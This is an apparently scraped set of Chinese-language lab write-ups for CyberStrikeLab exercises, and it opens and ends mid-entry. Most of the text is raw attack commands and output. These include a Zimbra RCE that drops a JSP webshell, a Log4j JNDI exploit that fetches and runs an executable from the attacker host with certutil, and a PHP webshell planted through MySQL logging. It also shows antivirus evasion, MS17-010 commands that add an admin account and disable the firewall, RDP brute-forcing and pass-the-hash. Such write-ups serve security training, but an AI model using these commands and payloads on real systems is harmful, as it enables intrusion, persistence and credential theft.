badpotato提权上线cs发现badpotato能提权，直接上线system","tags":["eyoucms","badpotato提权"]},{"title":"cyberstrikelab pt-6","path":"/2025/07/18/pt-6/","content":"pt-6信息收集(base) zimbra_poc [master] cat EOF 1.dtdheredoc !ENTITY % file SYSTEM file:../conf/localconfig.xml!ENTITY % start ![CDATA[!ENTITY % end ]]!ENTITY % all !ENTITY fileContents %start;%file;%end;heredoc EOF(base) zimbra_poc [master●] p -m http.server 8889Serving HTTP on :: port 8889 (http://[::]:8889/) ... zimbra-rce使用https://github.com/fnmsd/zimbra_poc，修改里面代码 访问shell要添加cookie,ZM_ADMIN_AUTH_TOKEN=0_327aeb35e11ac68ab87105b3667972569f9cfa4d_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313735323839363931353837373b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3538313139373535333b; (base) ZimbraExploit [master●●] python3 Zimbra_Rce.py https://10.0.0.12/Found existing alias for python3. You should use: phttps://10.0.0.12[*] Get User Name/Password By XXEzimbrarhqkAlU5n_[*] Get Low Privilege Auth Token[*] Get Admin Auth Token By SSRF[*] Uploading fileShell: https://10.0.0.12/downloads/c.jsp[*] Request Result:May need cookie:ZM_ADMIN_AUTH_TOKEN=0_327aeb35e11ac68ab87105b3667972569f9cfa4d_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313735323839363931353837373b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3538313139373535333b;","tags":["zimbra-rce"]},{"title":"cyberstrikelab pt-5","path":"/2025/07/18/pt-5/","content":"pt-5信息收集(base) 2.0.1 ./FScan_2.0.1_mac_arm64 -h www.rel8989.cslab -p 1-65535┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| __/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[557ms] 已选择服务扫描模式[557ms] 开始信息扫描[557ms] 最终有效主机数量: 1[557ms] 开始主机扫描[557ms] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[560ms] 有效端口数量: 65535[641ms] [*] 端口开放 www.rel8989.cslab:135[658ms] [*] 端口开放 www.rel8989.cslab:139[801ms] [*] 端口开放 www.rel8989.cslab:445[3.5s] [*] 端口开放 www.rel8989.cslab:5985[4.4s] [*] 端口开放 www.rel8989.cslab:8080[21.7s] [*] 端口开放 www.rel8989.cslab:47001[22.9s] [*] 端口开放 www.rel8989.cslab:49669[22.9s] [*] 端口开放 www.rel8989.cslab:49668[22.9s] [*] 端口开放 www.rel8989.cslab:49664[22.9s] [*] 端口开放 www.rel8989.cslab:49666[22.9s] [*] 端口开放 www.rel8989.cslab:49665[22.9s] [*] 端口开放 www.rel8989.cslab:49670[22.9s] [*] 端口开放 www.rel8989.cslab:49671[22.9s] [*] 端口开放 www.rel8989.cslab:49667[32.1s] 扫描完成, 发现 14 个开放端口[32.1s] 存活端口数量: 14[32.1s] 开始漏洞扫描[32.1s] POC加载完成: 总共387个，成功387个，失败0个[33.0s] [*] NetInfo 扫描结果目标主机: www.rel8989.cslab主机名: WIN-2PNAS7U283S发现的网络接口: IPv4地址: └─ 10.0.0.28[34.4s] [*] 网站标题 http://www.rel8989.cslab:8080 状态码:200 长度:22 标题:无标题[45.3s] 扫描已完成: 8/8 扫目录半天没找到看wp发现是目录/cslab (base) 2.0.1 curl http://www.rel8989.cslab:8080/cslab收到参数：null fuzz参数 (base) 2.0.1 arjun -u http://www.rel8989.cslab:8080/cslab _ /_| _ ( |/ /(//) v2.2.4 _/ Probing the target for stability Analysing HTTP response for anomalies Analysing HTTP response for potential parameter names Logicforcing the URL endpoint parameter detected: payload, based on: body length Parameters found: payload 发现参数是payload，因为本题提示是log4j，使用log4j参数测试 log4j(base) java_deserialize java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C certutil.exe -urlcache -split -f http://172.16.233.2:8889/fenli.exe fenli.exe -A 172.16.233.2[ADDRESS] 172.16.233.2[COMMAND] certutil.exe -urlcache -split -f http://172.16.233.2:8889/fenli.exe fenli.exe----------------------------JNDI Links----------------------------Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.16.233.2:1099/fzf2vrTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.16.233.2:1099/2mwfzsldap://172.16.233.2:1389/2mwfzsTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.16.233.2:1099/6vyiiildap://172.16.233.2:1389/6vyiii----------------------------Server Log----------------------------2025-07-18 22:45:20 [JETTYSERVER] Listening on 0.0.0.0:81802025-07-18 22:45:20 [RMISERVER] Listening on 0.0.0.0:10992025-07-18 22:45:20 [LDAPSERVER] Listening on 0.0.0.0:13892025-07-18 22:45:30 [RMISERVER] Have connection from /10.0.0.28:496822025-07-18 22:45:34 [RMISERVER] Reading message...2025-07-18 22:45:34 [RMISERVER] Is RMI.lookup call for fzf2vr 22025-07-18 22:45:34 [RMISERVER] Sending local classloading reference.2025-07-18 22:45:34 [RMISERVER] Closing connection (base) java_deserialize java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C certutil.exe -urlcache -split -f http://172.16.233.2:8889/360.ini 360.ini -A 172.16.233.2[ADDRESS] 172.16.233.2[COMMAND] certutil.exe -urlcache -split -f http://172.16.233.2:8889/360.ini 360.ini----------------------------JNDI Links----------------------------Target environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.16.233.2:1099/jhsdukldap://172.16.233.2:1389/jhsdukTarget environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.16.233.2:1099/j7rznbTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.16.233.2:1099/qrzb3uldap://172.16.233.2:1389/qrzb3u----------------------------Server Log----------------------------2025-07-18 22:47:24 [JETTYSERVER] Listening on 0.0.0.0:81802025-07-18 22:47:24 [RMISERVER] Listening on 0.0.0.0:10992025-07-18 22:47:25 [LDAPSERVER] Listening on 0.0.0.0:13892025-07-18 22:47:35 [RMISERVER] Have connection from /10.0.0.28:496862025-07-18 22:47:35 [RMISERVER] Reading message...2025-07-18 22:47:35 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:47:35 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:47:35 [RMISERVER] Closing connection2025-07-18 22:48:24 [RMISERVER] Have connection from /10.0.0.28:496872025-07-18 22:48:24 [RMISERVER] Reading message...2025-07-18 22:48:24 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:48:24 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:48:24 [RMISERVER] Closing connection2025-07-18 22:48:38 [RMISERVER] Have connection from /10.0.0.28:496882025-07-18 22:48:38 [RMISERVER] Reading message...2025-07-18 22:48:38 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:48:38 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:48:38 [RMISERVER] Closing connection2025-07-18 22:48:48 [RMISERVER] Have connection from /10.0.0.28:496892025-07-18 22:48:48 [RMISERVER] Reading message...2025-07-18 22:48:48 [RMISERVER] Is RMI.lookup call for jhsduk 22025-07-18 22:48:48 [RMISERVER] Sending remote classloading stub targeting http://172.16.233.2:8180/ExecTemplateJDK7.class2025-07-18 22:48:48 [RMISERVER] Closing connection2025-07-18 22:48:59 [RMISERVER] Have connection from /10.0.0.28:496902025-07-18 22:48:59 [RMISERVER] Reading message...2025-07-18 22:48:59 [RMISERVER] Is RMI.lookup call for j7rznb 22025-07-18 22:48:59 [RMISERVER] Sending local classloading reference.2025-07-18 22:48:59 [RMISERVER] Closing connection (base) java_deserialize java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C fenli.exe 360.ini -A 172.16.233.2[ADDRESS] 172.16.233.2[COMMAND] fenli.exe 360.ini----------------------------JNDI Links----------------------------Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):rmi://172.16.233.2:1099/hxmfdrTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):rmi://172.16.233.2:1099/kb1lsgldap://172.16.233.2:1389/kb1lsgTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):rmi://172.16.233.2:1099/lj1offldap://172.16.233.2:1389/lj1off----------------------------Server Log----------------------------2025-07-18 22:49:27 [JETTYSERVER] Listening on 0.0.0.0:81802025-07-18 22:49:27 [RMISERVER] Listening on 0.0.0.0:10992025-07-18 22:49:27 [LDAPSERVER] Listening on 0.0.0.0:13892025-07-18 22:49:36 [RMISERVER] Have connection from /10.0.0.28:496932025-07-18 22:49:36 [RMISERVER] Reading message...2025-07-18 22:49:36 [RMISERVER] Is RMI.lookup call for hxmfdr 22025-07-18 22:49:36 [RMISERVER] Sending local classloading reference.2025-07-18 22:49:36 [RMISERVER] Closing connection 然后主机上线了，权限是Administrator","tags":["log4j"]},{"title":"cyberstrikelab pt-4","path":"/2025/07/18/pt-4/","content":"pt-4 靶机ip: 10.0.0.3 攻击机ip: 172.16.233.2 dedecms(base) Downloads fscan -h 10.0.0.3 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan10.0.0.3:3306 open10.0.0.3:80 open10.0.0.3:139 open10.0.0.3:135 open10.0.0.3:445 open[*] alive ports len is: 5start vulscan[*] NetInfo[*]10.0.0.3 [-]WIN-CMET1BTTSGN [-]10.0.0.3[*] WebTitle http://10.0.0.3 code:200 len:24370 title:cyberstrikelab[+] InfoScan http://10.0.0.3 [CMS][+] PocScan http://10.0.0.3 poc-yaml-dedecms-carbuyaction-fileinclude 发现dedecms,查看版本http://10.0.0.3/data/admin/ver.txt返回20241028，比较新的版本 正面硬刚不行？那我侧面突破！对了，听说管理员桌面上有惊喜～ (base) dirsearch [master●●] dirsearch -u http://10.0.0.3/Users/gongtaiyun/Desktop/secs/tools/info/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11722Output: /Users/gongtaiyun/Desktop/secs/tools/info/dirsearch/reports/http_10.0.0.3/_25-07-18_15-32-58.txtTarget: http://10.0.0.3/[15:32:58] Starting:[15:33:01] 403 - 211B - /%3f/[15:33:01] 403 - 215B - /%C0%AE%C0%AE%C0%AF[15:33:03] 403 - 210B - /%ff[15:33:12] 403 - 220B - /.ht_wsr.txt[15:33:13] 403 - 223B - /.htaccess.bak1[15:33:13] 403 - 223B - /.htaccess.save[15:33:13] 403 - 225B - /.htaccess.sample[15:33:13] 403 - 224B - /.htaccess_extra[15:33:13] 403 - 221B - /.htaccess_sc[15:33:13] 403 - 221B - /.htaccessOLD[15:33:13] 403 - 221B - /.htaccessBAK[15:33:13] 403 - 222B - /.htaccessOLD2[15:33:13] 403 - 214B - /.html[15:33:13] 403 - 223B - /.htaccess.orig[15:33:13] 403 - 223B - /.htaccess_orig[15:33:13] 403 - 213B - /.htm[15:33:13] 403 - 223B - /.htpasswd_test[15:33:13] 403 - 219B - /.htpasswds[15:33:13] 403 - 220B - /.httr-oauth[15:33:36] 301 - 226B - /A - http://10.0.0.3/A/[15:33:36] 301 - 226B - /a - http://10.0.0.3/a/[15:34:11] 301 - 231B - /assets - http://10.0.0.3/assets/[15:34:12] 200 - 316B - /assets/[15:34:29] 200 - 3B - /data/cache/[15:34:29] 301 - 229B - /data - http://10.0.0.3/data/[15:34:29] 200 - 2KB - /data/[15:34:29] 200 - 3B - /data/sessions/[15:34:43] 200 - 1KB - /favicon.ico[15:34:52] 301 - 231B - /images - http://10.0.0.3/images/[15:34:52] 200 - 796B - /images/[15:34:53] 301 - 232B - /include - http://10.0.0.3/include/[15:34:53] 200 - 5KB - /include/[15:34:54] 403 - 225B - /index.php::$DATA[15:34:54] 301 - 232B - /Install - http://10.0.0.3/Install/[15:34:54] 301 - 232B - /INSTALL - http://10.0.0.3/INSTALL/[15:34:54] 301 - 232B - /install - http://10.0.0.3/install/[15:34:55] 200 - 3B - /install/[15:35:02] 301 - 226B - /m - http://10.0.0.3/m/[15:35:06] 301 - 231B - /member - http://10.0.0.3/member/[15:35:06] 200 - 5KB - /member/[15:35:06] 200 - 5KB - /member/login.php[15:35:21] 301 - 235B - /phpmyadmin - http://10.0.0.3/phpmyadmin/[15:35:21] 301 - 235B - /phpMyAdmin - http://10.0.0.3/phpMyAdmin/[15:35:25] 200 - 2KB - /phpmyadmin/README[15:35:25] 200 - 32KB - /phpmyadmin/ChangeLog[15:35:27] 301 - 229B - /plus - http://10.0.0.3/plus/[15:35:28] 200 - 4KB - /phpmyadmin/index.php[15:35:28] 200 - 4KB - /phpMyAdmin/[15:35:28] 200 - 4KB - /phpmyadmin/[15:35:28] 200 - 4KB - /phpMyadmin/[15:35:28] 200 - 4KB - /phpMyAdmin/index.php[15:35:28] 200 - 4KB - /phpmyAdmin/[15:35:35] 200 - 505B - /robots.txt[15:35:41] 200 - 5KB - /shell.php[15:35:45] 301 - 232B - /special - http://10.0.0.3/special/[15:35:53] 200 - 4KB - /tags.php[15:35:53] 301 - 233B - /templets - http://10.0.0.3/templets/[15:35:57] 403 - 225B - /Trace.axd::$DATA[15:35:59] 200 - 3B - /uploads/[15:36:00] 301 - 232B - /uploads - http://10.0.0.3/uploads/[15:36:08] 403 - 226B - /web.config::$DATA phpmyadminphpmyadmin用户名密码为 root/cyberstrikelab 发现写不了文件，用日志写入木马shell show global variables like %general%;1.查看日志功能是否开启 show global variables like %general%2.未开启的话设置为 on set global general_log=ON3.开启后将日志文件的存储位置改为可访问到的目录， 根目录即可 set global general_log_file = C:/WWW/1.php4.执行下边一句话木马 数据库将会将查询语句保存在日志文件中 SELECT ?php $a=~+d()^!+;$b=$$a[a];eval(.$b);?5.写入成功后 使用蚁剑连接 发现是SYSTEM权限 administrator用户桌面上：右键桌面-个性化，背景选择“幻灯片放映” 上线抓hash登录Administrator，结果执行不了很奇怪，直接远程桌面上线抓 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fnet user cc Admin@123 /addnet localgroup Administrators cc /addnetsh firewall set opmode disable 发现是有windows defender，直接关掉就能上线","tags":["dedecms","phpmyadmin"]},{"title":"cyberstrikelab lab8","path":"/2025/07/17/lab8/","content":"lab8信息收集(base) Downloads fscan -h 172.50.12.0/24172.50.12.33:80 open172.50.12.233:22 open172.50.12.33:135 open172.50.12.33:139 open172.50.12.33:445 open172.50.12.33:3306 open172.50.12.233:8080 open 发现zzzcms zzzcms进入http://172.50.12.33/admin/登录，账号为admin，密码为admin123456弱口令登入 然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为 html if:assert($_POST[1])xxxend if 然后访问http://172.50.12.33/search/`就是shell地址了 传文件一直失败，查看杀软 C:\\Users tasklist /svcӳ������ PID ���� ========================= ======== ============================================System Idle Process 0 ��ȱ System 4 ��ȱ smss.exe 284 ��ȱ csrss.exe 376 ��ȱ wininit.exe 456 ��ȱ csrss.exe 464 ��ȱ winlogon.exe 508 ��ȱ services.exe 572 ��ȱ lsass.exe 580 KeyIso, SamSs, VaultSvc svchost.exe 656 BrokerInfrastructure, DcomLaunch, LSM, PlugPlay, Power, SystemEventsBroker svchost.exe 692 RpcEptMapper, RpcSs dwm.exe 788 ��ȱ svchost.exe 836 BITS, DsmSvc, gpsvc, IKEEXT, iphlpsvc, ProfSvc, Schedule, SENS, ShellHWDetection, Themes, UserManager, UsoSvc, Winmgmt, WpnService, wuauserv svchost.exe 856 NcbService, PcaSvc, StorSvc, TrkWks, UALSVC, WdiSystemHost, wudfsvc svchost.exe 880 Dhcp, EventLog, lmhosts, TimeBrokerSvc svchost.exe 948 BFE, CoreMessagingRegistrar, DPS, MpsSvc svchost.exe 988 EventSystem, FontCache, LicenseManager, netprofm, nsi, W32Time, WinHttpAutoProxySvc svchost.exe 400 Wcmsvc svchost.exe 372 CryptSvc, Dnscache, LanmanWorkstation, NlaSvc, WinRM ZhuDongFangYu.exe 648 ZhuDongFangYu svchost.exe 1336 StateRepository, tiledatamodelsvc svchost.exe 1476 PolicyAgent spoolsv.exe 1568 Spooler svchost.exe 1720 DiagTrack httpd.exe 1792 Apache2.4 svchost.exe 1828 LanmanServer phpStudyServer.exe 1856 phpStudySrv mysqld.exe 1908 mysql cmd.exe 2108 ��ȱ conhost.exe 2216 ��ȱ httpd.exe 2272 ��ȱ ChsIME.exe 6576 ��ȱ RuntimeBroker.exe 6784 ��ȱ sihost.exe 6840 ��ȱ svchost.exe 6852 CDPUserSvc_61bac, OneSyncSvc_61bac taskhostw.exe 6880 ��ȱ ChsIME.exe 7056 ��ȱ explorer.exe 7128 ��ȱ ShellExperienceHost.exe 6512 ��ȱ SearchUI.exe 7260 ��ȱ svchost.exe 7632 SSDPSRV ServerManager.exe 7704 ��ȱ 360Tray.exe 8048 ��ȱ 360speedld.exe 8164 ��ȱ msdtc.exe 8880 MSDTC WmiPrvSE.exe 6500 ��ȱ taskhostw.exe 9188 ��ȱ TrustedInstaller.exe 1056 TrustedInstaller TiWorker.exe 8596 ��ȱ taskhostw.exe 8988 ��ȱ php-cgi.exe 7284 ��ȱ cmd.exe 8844 ��ȱ conhost.exe 8612 ��ȱ cmd.exe 8956 ��ȱ tasklist.exe 9024 ��ȱ WmiPrvSE.exe 916 ��ȱ 有360，使用https://github.com/Pizz33/GobypassAV-shellcode分离免杀过了 然后内置potato直接提权成功 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fset RHOSTS 192.168.20.20net user cc Admin@123 /addnet localgroup Administrators cc /addnetsh firewall set opmode disable C:\\Users\\cc\\Desktopfscan.exe -h 10.5.5.0/24 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 10.5.5.2 is alive(icmp) Target 10.5.5.33 is alive(icmp) Target 10.5.5.66 is alive[*] Icmp alive hosts len is: 310.5.5.66:88 open10.5.5.2:3306 open10.5.5.66:445 open10.5.5.33:445 open10.5.5.2:445 open10.5.5.66:139 open10.5.5.33:139 open10.5.5.2:139 open10.5.5.66:135 open10.5.5.33:135 open10.5.5.2:135 open10.5.5.2:80 open[*] alive ports len is: 12start vulscan[*] NetInfo[*]10.5.5.2 [-]WIN-NQOLAOUO8C1 [-]172.50.12.33 [-]10.5.5.2[*] OsInfo 10.5.5.66 (Windows Server 2012 R2 Standard 9600)[*] WebTitle http://10.5.5.2 code:200 len:20013 title:cyberstrikelabzzzcms[*] OsInfo 10.5.5.33 (Windows Server 2016 Standard 14393)[*] NetInfo[*]10.5.5.33 [-]cyberweb [-]10.5.5.33[*] NetInfo[*]10.5.5.66 [-]DC [-]10.5.5.66[*] NetBios 10.5.5.33 cyberweb.cyberstrikelab.com Windows Server 2016 Standard 14393 C:\\Users\\cc\\Desktopfscan.exe -h 10.5.5.33 -p 1-65535 ___ _ / _ \\ ___ ___ _ __ __ _ ___| | __ / /_\\/____/ __|/ __| __/ _` |/ __| |/ // /_\\\\_____\\__ \\ (__| | | (_| | (__| \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ fscan version: 1.8.4start infoscan10.5.5.33:139 open10.5.5.33:135 open10.5.5.33:445 open10.5.5.33:3389 open10.5.5.33:5985 open10.5.5.33:47001 open10.5.5.33:49665 open10.5.5.33:49664 open10.5.5.33:49667 open10.5.5.33:49666 open10.5.5.33:49671 open10.5.5.33:49670 open10.5.5.33:49669 open10.5.5.33:49668 open[*] alive ports len is: 14start vulscan[*] NetInfo[*]10.5.5.33 [-]cyberweb [-]10.5.5.33[*] NetBios 10.5.5.33 cyberweb.cyberstrikelab.com Windows Server 2016 Standard 14393[*] OsInfo 10.5.5.33 (Windows Server 2016 Standard 14393)[*] WebTitle http://10.5.5.33:47001 code:404 len:315 title:Not Found[*] WebTitle http://10.5.5.33:5985 code:404 len:315 title:Not Found已完成 13/14 [-] (60/210) rdp 10.5.5.33:3389 administrator sysadmin remote error: tls: access denied已完成 13/14 [-] (120/210) rdp 10.5.5.33:3389 admin a11111 remote error: tls: access denied已完成 13/14 [-] (180/210) rdp 10.5.5.33:3389 guest 123456~a remote error: tls: access denied rdp密码爆破开了3389，爆破一下密码 (base) ➜ ~ hydra -l administrator -P pass.txt rdp://10.5.5.33 -V -I[3389][rdp] host: 10.5.5.33 login: administrator password: admin@123456 密码是admin@123456 cs内置svc直接提取成功 非约束委派ADFind查询非约束机器账户 AdFind.exe -b DC=cyberstrikelab,DC=com -f ((samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) dn","tags":["zzzcms","rdp密码爆破","tag3"]},{"title":"cyberstrikelab lab7","path":"/2025/07/17/lab7/","content":"lab7信息收集(base) qscan ./qscan_mac_arm64 -t 192.168.10.10 -p 1-65535\t┏┓┏┏┏┓┏┓\t┗┫┛┗┗┻┛┗ ┗Tips: 可以使用--check参数，对给定的ip:port,protocol://ip:port/path等字符串进行检测，且不会进行端口扫描[+]2025/07/17 15:13:02 当前环境为：darwin, 输出编码为：utf-8[+]2025/07/17 15:13:02 成功加载HTTP指纹:[24758]条[+]2025/07/17 15:13:02 成功加载NMAP探针:[150]个,指纹[11916]条[*]2025/07/17 15:13:02 未检测到qqwry.dat,将关闭CDN检测功能，如需开启，请执行kscan --download-qqwry下载该文件[+]2025/07/17 15:13:03 Domain、IP、Port、URL、Hydra引擎已准备就绪[+]2025/07/17 15:13:03 所有扫描任务已下发完毕netbios://192.168.10.10:139 netbios Length:5,Port:139,Digest:\\x83\\x00\\x00\\x01\\x8f,ProductName:icrosoftWindowsnetbios,OperatingSystem:Windowssmb://192.168.10.10:445 smb Port:445,Digest:SMB@A\\kNq/M1@`+00,0+7,Length:518mysql://192.168.10.10:3306 mysql Port:3306,Digest:GjHost192.168.122.21,ProductName:MySQL,Info:unauthorized,DeviceType:cpe:,Length:75http://192.168.10.10:9652 网站标题-网站标题-PoweredByBageCMS Length:15010,Port:9652,ICP:浙ICP备13017320号-1,FoundDomain:ww.bagesoft.cn、www.bagec,Digest:网站标题网站标题网站关键字网站描述头八哥首页产品,FingerPrint:BageCMS;PHP;Apache;MetaGenerator;JQuery;Meta-Author;Apachehttpd/2.4.39;Apachehttpd;v;(Win64)OpenSSL/1.1.1bmod_fcgid/2.3.9amod_log_rotate/1.02[+]2025/07/17 15:13:46 程序执行总时长为：[44.167906s] 发现BageCMS BageCMS 访问 http://192.168.10.10:9652/?r=admini/public/login 进入登录页面 弱口令admin/admin123456登录 发现DC有MS17-010，直接打 MS17-010msf6 exploit(windows/smb/ms17_010_psexec) use auxiliary/admin/smb/ms17_010_commandmsf6 auxiliary(admin/smb/ms17_010_command) set RHOST 192.168.20.40RHOST = 192.168.20.40use auxiliary/admin/smb/ms17_010_commandmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND net user cc Admin@123 /addCOMMAND = net user cc Admin@123 /addmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 192.168.20.40:445 - Target OS: Windows Server 2016 Standard 14393[*] 192.168.20.40:445 - Built a write-what-where primitive...[+] 192.168.20.40:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.20.40:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.20.40:445 - Getting the command output...[*] 192.168.20.40:445 - Executing cleanup...[+] 192.168.20.40:445 - Cleanup was successful[+] 192.168.20.40:445 - Command completed successfully![*] 192.168.20.40:445 - Output for net user cc Admin@123 /add:����ɹ���ɡ�[*] 192.168.20.40:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(admin/smb/ms17_010_command) set COMMAND net localgroup Administrators cc /addCOMMAND = net localgroup Administrators cc /addmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 192.168.20.40:445 - Target OS: Windows Server 2016 Standard 14393[*] 192.168.20.40:445 - Built a write-what-where primitive...[+] 192.168.20.40:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.20.40:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.20.40:445 - Getting the command output...[*] 192.168.20.40:445 - Executing cleanup...[+] 192.168.20.40:445 - Cleanup was successful[+] 192.168.20.40:445 - Command completed successfully![*] 192.168.20.40:445 - Output for net localgroup Administrators cc /add:����ɹ���ɡ�[*] 192.168.20.40:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 exploit(windows/smb/ms17_010_psexec) set RHOSTS 192.168.20.40use auxiliary/admin/smb/ms17_010_commandRHOSTS = 192.168.20.40use auxiliary/admin/smb/ms17_010_commandmsf6 exploit(windows/smb/ms17_010_psexec) use auxiliary/admin/smb/ms17_010_commandmsf6 auxiliary(admin/smb/ms17_010_command) set RHOSTS 192.168.20.40RHOSTS = 192.168.20.40msf6 auxiliary(admin/smb/ms17_010_command) set COMMAND REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fCOMMAND = REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /fmsf6 auxiliary(admin/smb/ms17_010_command) run[*] 192.168.20.40:445 - Target OS: Windows Server 2016 Standard 14393[*] 192.168.20.40:445 - Built a write-what-where primitive...[+] 192.168.20.40:445 - Overwrite complete... SYSTEM session obtained![+] 192.168.20.40:445 - Service start timed out, OK if running a command or non-service executable...[*] 192.168.20.40:445 - Getting the command output...[*] 192.168.20.40:445 - Executing cleanup...[+] 192.168.20.40:445 - Cleanup was successful[+] 192.168.20.40:445 - Command completed successfully![*] 192.168.20.40:445 - Output for REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f:����ɹ���ɡ�[*] 192.168.20.40:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed 远程桌面连接，上传mimikatz 没找到Administrator的hash，直接cs来看 (base) examples [master●] python3 psexec.py -hashes :d8174fc8c5ee7a8e460df2e61d00bd3c cyberstrikelab.com/Administrator@192.168.20.20Found existing alias for python3. You should use: p/opt/anaconda3/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools81. import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 192.168.20.20.....[*] Found writable share ADMIN$[*] Uploading file nPSGhUMc.exe[*] Opening SVCManager on 192.168.20.20.....[*] Creating service bAXl on 192.168.20.20.....[*] Starting service bAXl.....[!] Press help for extra shell commands[-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codecMicrosoft Windows [�汾 6.3.9600][-] Decoding error detected, consider running chcp.com at the target,map the result with https://docs.python.org/3/library/codecs.html#standard-encodingsand then execute smbexec.py again with -codec and the corresponding codec(c) 2013 Microsoft Corporation����������Ȩ����C:\\Windows\\system32","tags":["MS17-010","BageCMS"]},{"title":"cyberstrikelab lab6","path":"/2025/07/16/lab6/","content":"lab6 靶机ip: 192.168. 攻击机ip: 192.168. 信息收集192.168.10.233:22 open192.168.10.10:80 open192.168.10.10:135 open192.168.10.20:135 open192.168.10.10:139 open192.168.10.20:139 open192.168.10.20:445 open192.168.10.10:445 open192.168.10.10:3306 open192.168.10.20:7001 open192.168.10.233:8080 open[*] alive ports len is: 11start vulscan已完成 0/11 [-] mysql 192.168.10.10:3306 root 123456 Error 1130: Host 192.168.122.209 is not allowed to connect to this MySQL server[*] NetInfo[*]192.168.10.10 [-]WIN-P5ECGG92B08 [-]192.168.10.10[*] WebTitle https://192.168.10.233:8080 code:404 len:19 title:None[*] NetBios 192.168.10.20 cyberweb.cyberstrikelab.com Windows Server 2012 R2 Standard 9600[*] WebTitle http://192.168.10.10 code:200 len:6060 title:Home[*] WebTitle http://192.168.10.20:7001 code:404 len:1164 title:Error 404--Not Found[+] InfoScan http://192.168.10.20:7001 [weblogic] 发现是jooml，使用 https://github.com/kiks7/rusty_joomla_rce (base) rusty_joomla_rce [master] python3 